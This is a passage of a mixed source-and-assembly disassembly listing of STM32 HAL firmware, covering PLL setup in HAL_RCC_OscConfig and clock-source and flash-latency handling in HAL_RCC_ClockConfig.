 8003f28:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003f2a:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f2c:	429a      	cmp	r2, r3
 8003f2e:	d113      	bne.n	8003f58 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f30:	697b      	ldr	r3, [r7, #20]
 8003f32:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003f36:	687b      	ldr	r3, [r7, #4]
 8003f38:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003f3a:	085b      	lsrs	r3, r3, #1
 8003f3c:	3b01      	subs	r3, #1
 8003f3e:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f40:	429a      	cmp	r2, r3
 8003f42:	d109      	bne.n	8003f58 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003f44:	697b      	ldr	r3, [r7, #20]
 8003f46:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003f4a:	687b      	ldr	r3, [r7, #4]
 8003f4c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003f4e:	085b      	lsrs	r3, r3, #1
 8003f50:	3b01      	subs	r3, #1
 8003f52:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f54:	429a      	cmp	r2, r3
 8003f56:	d06b      	beq.n	8004030 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003f58:	69bb      	ldr	r3, [r7, #24]
 8003f5a:	2b0c      	cmp	r3, #12
 8003f5c:	d062      	beq.n	8004024 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003f5e:	4b32      	ldr	r3, [pc, #200]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003f60:	681b      	ldr	r3, [r3, #0]
 8003f62:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003f66:	2b00      	cmp	r3, #0
 8003f68:	d001      	beq.n	8003f6e <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003f6a:	2301      	movs	r3, #1
 8003f6c:	e0ac      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003f6e:	4b2e      	ldr	r3, [pc, #184]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003f70:	681b      	ldr	r3, [r3, #0]
 8003f72:	4a2d      	ldr	r2, [pc, #180]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003f74:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003f78:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003f7a:	f7fd f915 	bl	80011a8 <HAL_GetTick>
 8003f7e:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f80:	e008      	b.n	8003f94 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003f82:	f7fd f911 	bl	80011a8 <HAL_GetTick>
 8003f86:	4602      	mov	r2, r0
 8003f88:	693b      	ldr	r3, [r7, #16]
 8003f8a:	1ad3      	subs	r3, r2, r3
 8003f8c:	2b02      	cmp	r3, #2
 8003f8e:	d901      	bls.n	8003f94 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003f90:	2303      	movs	r3, #3
 8003f92:	e099      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f94:	4b24      	ldr	r3, [pc, #144]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003f96:	681b      	ldr	r3, [r3, #0]
 8003f98:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003f9c:	2b00      	cmp	r3, #0
 8003f9e:	d1f0      	bne.n	8003f82 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8003fa0:	4b21      	ldr	r3, [pc, #132]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003fa2:	68da      	ldr	r2, [r3, #12]
 8003fa4:	4b21      	ldr	r3, [pc, #132]	; (800402c <HAL_RCC_OscConfig+0x77c>)
 8003fa6:	4013      	ands	r3, r2
 8003fa8:	687a      	ldr	r2, [r7, #4]
 8003faa:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8003fac:	687a      	ldr	r2, [r7, #4]
 8003fae:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8003fb0:	3a01      	subs	r2, #1
 8003fb2:	0112      	lsls	r2, r2, #4
 8003fb4:	4311      	orrs	r1, r2
 8003fb6:	687a      	ldr	r2, [r7, #4]
 8003fb8:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8003fba:	0212      	lsls	r2, r2, #8
 8003fbc:	4311      	orrs	r1, r2
 8003fbe:	687a      	ldr	r2, [r7, #4]
 8003fc0:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8003fc2:	0852      	lsrs	r2, r2, #1
 8003fc4:	3a01      	subs	r2, #1
 8003fc6:	0552      	lsls	r2, r2, #21
 8003fc8:	4311      	orrs	r1, r2
 8003fca:	687a      	ldr	r2, [r7, #4]
 8003fcc:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8003fce:	0852      	lsrs	r2, r2, #1
 8003fd0:	3a01      	subs	r2, #1
 8003fd2:	0652      	lsls	r2, r2, #25
 8003fd4:	4311      	orrs	r1, r2
 8003fd6:	687a      	ldr	r2, [r7, #4]
 8003fd8:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8003fda:	06d2      	lsls	r2, r2, #27
 8003fdc:	430a      	orrs	r2, r1
 8003fde:	4912      	ldr	r1, [pc, #72]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003fe0:	4313      	orrs	r3, r2
 8003fe2:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8003fe4:	4b10      	ldr	r3, [pc, #64]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003fe6:	681b      	ldr	r3, [r3, #0]
 8003fe8:	4a0f      	ldr	r2, [pc, #60]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003fea:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fee:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8003ff0:	4b0d      	ldr	r3, [pc, #52]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003ff2:	68db      	ldr	r3, [r3, #12]
 8003ff4:	4a0c      	ldr	r2, [pc, #48]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003ff6:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003ffa:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003ffc:	f7fd f8d4 	bl	80011a8 <HAL_GetTick>
 8004000:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004002:	e008      	b.n	8004016 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004004:	f7fd f8d0 	bl	80011a8 <HAL_GetTick>
 8004008:	4602      	mov	r2, r0
 800400a:	693b      	ldr	r3, [r7, #16]
 800400c:	1ad3      	subs	r3, r2, r3
 800400e:	2b02      	cmp	r3, #2
 8004010:	d901      	bls.n	8004016 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 8004012:	2303      	movs	r3, #3
 8004014:	e058      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004016:	4b04      	ldr	r3, [pc, #16]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8004018:	681b      	ldr	r3, [r3, #0]
 800401a:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800401e:	2b00      	cmp	r3, #0
 8004020:	d0f0      	beq.n	8004004 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004022:	e050      	b.n	80040c6 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8004024:	2301      	movs	r3, #1
 8004026:	e04f      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
 8004028:	40021000 	.word	0x40021000
 800402c:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004030:	4b27      	ldr	r3, [pc, #156]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 8004032:	681b      	ldr	r3, [r3, #0]
 8004034:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004038:	2b00      	cmp	r3, #0
 800403a:	d144      	bne.n	80040c6 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 800403c:	4b24      	ldr	r3, [pc, #144]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 800403e:	681b      	ldr	r3, [r3, #0]
 8004040:	4a23      	ldr	r2, [pc, #140]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 8004042:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004046:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004048:	4b21      	ldr	r3, [pc, #132]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 800404a:	68db      	ldr	r3, [r3, #12]
 800404c:	4a20      	ldr	r2, [pc, #128]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 800404e:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004052:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 8004054:	f7fd f8a8 	bl	80011a8 <HAL_GetTick>
 8004058:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800405a:	e008      	b.n	800406e <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800405c:	f7fd f8a4 	bl	80011a8 <HAL_GetTick>
 8004060:	4602      	mov	r2, r0
 8004062:	693b      	ldr	r3, [r7, #16]
 8004064:	1ad3      	subs	r3, r2, r3
 8004066:	2b02      	cmp	r3, #2
 8004068:	d901      	bls.n	800406e <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 800406a:	2303      	movs	r3, #3
 800406c:	e02c      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800406e:	4b18      	ldr	r3, [pc, #96]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 8004070:	681b      	ldr	r3, [r3, #0]
 8004072:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004076:	2b00      	cmp	r3, #0
 8004078:	d0f0      	beq.n	800405c <HAL_RCC_OscConfig+0x7ac>
 800407a:	e024      	b.n	80040c6 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 800407c:	69bb      	ldr	r3, [r7, #24]
 800407e:	2b0c      	cmp	r3, #12
 8004080:	d01f      	beq.n	80040c2 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 8004082:	4b13      	ldr	r3, [pc, #76]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 8004084:	681b      	ldr	r3, [r3, #0]
 8004086:	4a12      	ldr	r2, [pc, #72]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 8004088:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 800408c:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 800408e:	f7fd f88b 	bl	80011a8 <HAL_GetTick>
 8004092:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004094:	e008      	b.n	80040a8 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004096:	f7fd f887 	bl	80011a8 <HAL_GetTick>
 800409a:	4602      	mov	r2, r0
 800409c:	693b      	ldr	r3, [r7, #16]
 800409e:	1ad3      	subs	r3, r2, r3
 80040a0:	2b02      	cmp	r3, #2
 80040a2:	d901      	bls.n	80040a8 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 80040a4:	2303      	movs	r3, #3
 80040a6:	e00f      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80040a8:	4b09      	ldr	r3, [pc, #36]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 80040aa:	681b      	ldr	r3, [r3, #0]
 80040ac:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80040b0:	2b00      	cmp	r3, #0
 80040b2:	d1f0      	bne.n	8004096 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 80040b4:	4b06      	ldr	r3, [pc, #24]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 80040b6:	68da      	ldr	r2, [r3, #12]
 80040b8:	4905      	ldr	r1, [pc, #20]	; (80040d0 <HAL_RCC_OscConfig+0x820>)
 80040ba:	4b06      	ldr	r3, [pc, #24]	; (80040d4 <HAL_RCC_OscConfig+0x824>)
 80040bc:	4013      	ands	r3, r2
 80040be:	60cb      	str	r3, [r1, #12]
 80040c0:	e001      	b.n	80040c6 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 80040c2:	2301      	movs	r3, #1
 80040c4:	e000      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 80040c6:	2300      	movs	r3, #0
}
 80040c8:	4618      	mov	r0, r3
 80040ca:	3720      	adds	r7, #32
 80040cc:	46bd      	mov	sp, r7
 80040ce:	bd80      	pop	{r7, pc}
 80040d0:	40021000 	.word	0x40021000
 80040d4:	feeefffc 	.word	0xfeeefffc

080040d8 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 80040d8:	b580      	push	{r7, lr}
 80040da:	b084      	sub	sp, #16
 80040dc:	af00      	add	r7, sp, #0
 80040de:	6078      	str	r0, [r7, #4]
 80040e0:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 80040e2:	687b      	ldr	r3, [r7, #4]
 80040e4:	2b00      	cmp	r3, #0
 80040e6:	d101      	bne.n	80040ec <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 80040e8:	2301      	movs	r3, #1
 80040ea:	e0e7      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 80040ec:	4b75      	ldr	r3, [pc, #468]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 80040ee:	681b      	ldr	r3, [r3, #0]
 80040f0:	f003 0307 	and.w	r3, r3, #7
 80040f4:	683a      	ldr	r2, [r7, #0]
 80040f6:	429a      	cmp	r2, r3
 80040f8:	d910      	bls.n	800411c <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80040fa:	4b72      	ldr	r3, [pc, #456]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 80040fc:	681b      	ldr	r3, [r3, #0]
 80040fe:	f023 0207 	bic.w	r2, r3, #7
 8004102:	4970      	ldr	r1, [pc, #448]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 8004104:	683b      	ldr	r3, [r7, #0]
 8004106:	4313      	orrs	r3, r2
 8004108:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800410a:	4b6e      	ldr	r3, [pc, #440]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 800410c:	681b      	ldr	r3, [r3, #0]
 800410e:	f003 0307 	and.w	r3, r3, #7
 8004112:	683a      	ldr	r2, [r7, #0]
 8004114:	429a      	cmp	r2, r3
 8004116:	d001      	beq.n	800411c <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 8004118:	2301      	movs	r3, #1
 800411a:	e0cf      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 800411c:	687b      	ldr	r3, [r7, #4]
 800411e:	681b      	ldr	r3, [r3, #0]
 8004120:	f003 0302 	and.w	r3, r3, #2
 8004124:	2b00      	cmp	r3, #0
 8004126:	d010      	beq.n	800414a <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004128:	687b      	ldr	r3, [r7, #4]
 800412a:	689a      	ldr	r2, [r3, #8]
 800412c:	4b66      	ldr	r3, [pc, #408]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 800412e:	689b      	ldr	r3, [r3, #8]
 8004130:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004134:	429a      	cmp	r2, r3
 8004136:	d908      	bls.n	800414a <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004138:	4b63      	ldr	r3, [pc, #396]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 800413a:	689b      	ldr	r3, [r3, #8]
 800413c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004140:	687b      	ldr	r3, [r7, #4]
 8004142:	689b      	ldr	r3, [r3, #8]
 8004144:	4960      	ldr	r1, [pc, #384]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004146:	4313      	orrs	r3, r2
 8004148:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 800414a:	687b      	ldr	r3, [r7, #4]
 800414c:	681b      	ldr	r3, [r3, #0]
 800414e:	f003 0301 	and.w	r3, r3, #1
 8004152:	2b00      	cmp	r3, #0
 8004154:	d04c      	beq.n	80041f0 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 8004156:	687b      	ldr	r3, [r7, #4]
 8004158:	685b      	ldr	r3, [r3, #4]
 800415a:	2b03      	cmp	r3, #3
 800415c:	d107      	bne.n	800416e <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800415e:	4b5a      	ldr	r3, [pc, #360]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004160:	681b      	ldr	r3, [r3, #0]
 8004162:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004166:	2b00      	cmp	r3, #0
 8004168:	d121      	bne.n	80041ae <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 800416a:	2301      	movs	r3, #1
 800416c:	e0a6      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 800416e:	687b      	ldr	r3, [r7, #4]
 8004170:	685b      	ldr	r3, [r3, #4]
 8004172:	2b02      	cmp	r3, #2
 8004174:	d107      	bne.n	8004186 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8004176:	4b54      	ldr	r3, [pc, #336]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004178:	681b      	ldr	r3, [r3, #0]
 800417a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800417e:	2b00      	cmp	r3, #0
 8004180:	d115      	bne.n	80041ae <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004182:	2301      	movs	r3, #1
 8004184:	e09a      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 8004186:	687b      	ldr	r3, [r7, #4]
 8004188:	685b      	ldr	r3, [r3, #4]
 800418a:	2b00      	cmp	r3, #0
 800418c:	d107      	bne.n	800419e <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 800418e:	4b4e      	ldr	r3, [pc, #312]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004190:	681b      	ldr	r3, [r3, #0]
 8004192:	f003 0302 	and.w	r3, r3, #2
 8004196:	2b00      	cmp	r3, #0
 8004198:	d109      	bne.n	80041ae <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800419a:	2301      	movs	r3, #1
 800419c:	e08e      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 800419e:	4b4a      	ldr	r3, [pc, #296]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 80041a0:	681b      	ldr	r3, [r3, #0]
 80041a2:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80041a6:	2b00      	cmp	r3, #0
 80041a8:	d101      	bne.n	80041ae <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80041aa:	2301      	movs	r3, #1
 80041ac:	e086      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 80041ae:	4b46      	ldr	r3, [pc, #280]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 80041b0:	689b      	ldr	r3, [r3, #8]
 80041b2:	f023 0203 	bic.w	r2, r3, #3
 80041b6:	687b      	ldr	r3, [r7, #4]
 80041b8:	685b      	ldr	r3, [r3, #4]
 80041ba:	4943      	ldr	r1, [pc, #268]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 80041bc:	4313      	orrs	r3, r2
 80041be:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 80041c0:	f7fc fff2 	bl	80011a8 <HAL_GetTick>
 80041c4:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041c6:	e00a      	b.n	80041de <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 80041c8:	f7fc ffee 	bl	80011a8 <HAL_GetTick>
 80041cc:	4602      	mov	r2, r0
 80041ce:	68fb      	ldr	r3, [r7, #12]
 80041d0:	1ad3      	subs	r3, r2, r3
 80041d2:	f241 3288 	movw	r2, #5000	; 0x1388
 80041d6:	4293      	cmp	r3, r2
 80041d8:	d901      	bls.n	80041de <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 80041da:	2303      	movs	r3, #3
 80041dc:	e06e      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041de:	4b3a      	ldr	r3, [pc, #232]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 80041e0:	689b      	ldr	r3, [r3, #8]
 80041e2:	f003 020c 	and.w	r2, r3, #12
 80041e6:	687b      	ldr	r3, [r7, #4]
 80041e8:	685b      	ldr	r3, [r3, #4]
 80041ea:	009b      	lsls	r3, r3, #2
 80041ec:	429a      	cmp	r2, r3
 80041ee:	d1eb      	bne.n	80041c8 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80041f0:	687b      	ldr	r3, [r7, #4]
 80041f2:	681b      	ldr	r3, [r3, #0]
 80041f4:	f003 0302 	and.w	r3, r3, #2
 80041f8:	2b00      	cmp	r3, #0
 80041fa:	d010      	beq.n	800421e <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80041fc:	687b      	ldr	r3, [r7, #4]
 80041fe:	689a      	ldr	r2, [r3, #8]
 8004200:	4b31      	ldr	r3, [pc, #196]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004202:	689b      	ldr	r3, [r3, #8]
 8004204:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004208:	429a      	cmp	r2, r3
 800420a:	d208      	bcs.n	800421e <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
